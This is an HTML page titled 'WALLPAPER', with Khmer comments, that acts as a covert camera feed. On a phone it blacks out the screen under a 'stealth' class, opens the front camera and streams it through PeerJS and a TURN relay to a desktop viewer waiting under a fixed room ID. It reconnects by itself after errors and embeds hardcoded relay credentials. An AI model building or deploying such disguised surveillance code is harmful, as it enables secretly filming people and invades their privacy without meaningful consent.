<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WALLPAPER</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        html, body { 
            margin: 0; 
            padding: 0; 
            width: 100%; 
            height: 100%; 
            background-color: #000000; 
            overflow: hidden; 
            font-family: sans-serif; 
        }

        #pc-ui {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
        }

        video { 
            height: 100vh;      
            width: auto;        
            object-fit: contain; 
            background: #000; 
            display: none; 
        }

        #status { 
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            color: #2ac767; 
            font-weight: bold; 
            font-size: 22px; 
            text-align: center; 
            z-index: 10; 
            background: rgba(0, 0, 0, 0.8); 
            padding: 15px 25px; 
            border-radius: 8px; 
            pointer-events: none;
        }

        .phone-stealth-mode { background: #000000 !important; }
        .phone-stealth-mode #pc-ui { display: none !important; }
    </style>
</head>
<body>

    <div id="pc-ui">
        <div id="status">📡 កំពុងភ្ជាប់ទៅកាមេរ៉ាពីចម្ងាយ (អ៊ីនធឺណិតខុសគ្នា)...</div>
        <video id="view-video" autoplay playsinline muted></video>
    </div>

    <script>
        // ប្តូរឈ្មោះបន្ទប់ថ្មីស្រឡាងដើម្បីចាប់យកម៉ាស៊ីនមេថ្មី
        const LIVE_ROOM_ID = 'hino-global-secure-cam-2026';
        
        // 🛠️ ផ្លាស់ប្តូរមកប្រើប្រព័ន្ធម៉ាស៊ីនមេជំនាញពិសេស (Global TURN Server) ទម្លុះរាល់ប្រព័ន្ធស៊ីមទូរសព្ទ
        const peerConfig = {
            config: {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    {
                        urls: [
                            'turn:global.relay.metered.ca:443?transport=tcp',
                            'turn:global.relay.metered.ca:80?transport=tcp',
                            'turn:global.relay.metered.ca:443',
                            'turn:global.relay.metered.ca:80'
                        ],
                        username: '6cee07469a4731d683709b68',
                        credential: 'O9YgqUqX0A/iP/X/'
                    }
                ]
            }
        };
        
        let peer = null;
        let currentCall = null; 
        let localStream = null;

        window.onload = function() {
            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

            if (!isMobileDevice) {
                runAsPC();
            } else {
                document.body.classList.add('phone-stealth-mode');
                startCamera();
            }
        };

        // --- ផ្នែកកុំព្យូទ័រ ---
        function runAsPC() {
            if (peer) peer.destroy();
            peer = new Peer(LIVE_ROOM_ID, peerConfig);

            peer.on('call', (call) => {
                if (currentCall) {
                    call.answer();
                    setTimeout(() => { call.close(); }, 500);
                    return;
                }

                call.answer();
                currentCall = call; 
                
                call.on('stream', (remoteStream) => {
                    document.getElementById('status').style.display = 'none';
                    const video = document.getElementById('view-video');
                    video.style.display = 'block';
                    video.srcObject = remoteStream;
                    
                    video.play().catch(err => {
                        document.getElementById('status').style.display = 'block';
                        document.getElementById('status').style.color = '#ff3333';
                        document.getElementById('status').innerText = "🛑 សូមចុចលើអេក្រង់កុំព្យូទ័រ ១ដង ដើម្បីបើករូបភាព";
                        
                        document.body.onclick = () => {
                            video.play();
                            document.getElementById('status').style.display = 'none';
                        };
                    });
                });

                call.on('close', () => {
                    handleDisconnect();
                });
            });

            peer.on('error', (err) => {
                setTimeout(runAsPC, 2000);
            });
        }

        function handleDisconnect() {
            document.getElementById('status').style.display = 'block';
            document.getElementById('status').style.color = '#2ac767';
            document.getElementById('status').innerText = "📭 ទូរសព្ទបានដាច់។ កំពុងរង់ចាំការភ្ជាប់ឡើងវិញអូតូ...";
            const video = document.getElementById('view-video');
            video.style.display = 'none';
            video.srcObject = null;
            currentCall = null; 
        }

        // --- ផ្នែកទូរសព្ទ ---
        function startCamera() {
            navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: "user", 
                    width: { ideal: 640 }, 
                    height: { ideal: 480 },
                    frameRate: { ideal: 15 }
                },
                audio: false
            })
            .then((stream) => {
                localStream = stream;
                connectToPC();
            })
            .catch((err) => {
                setTimeout(startCamera, 5000);
            });
        }

        function connectToPC() {
            if (peer) peer.destroy();
            peer = new Peer(peerConfig); 

            peer.on('open', (id) => {
                const call = peer.call(LIVE_ROOM_ID, localStream);
                if (call) {
                    currentCall = call;
                    call.on('close', () => {
                        currentCall = null;
                        setTimeout(connectToPC, 3000);
                    });
                }
            });

            peer.on('error', (err) => {
                setTimeout(connectToPC, 4000);
            });
        }
    </script>
</body>
</html>
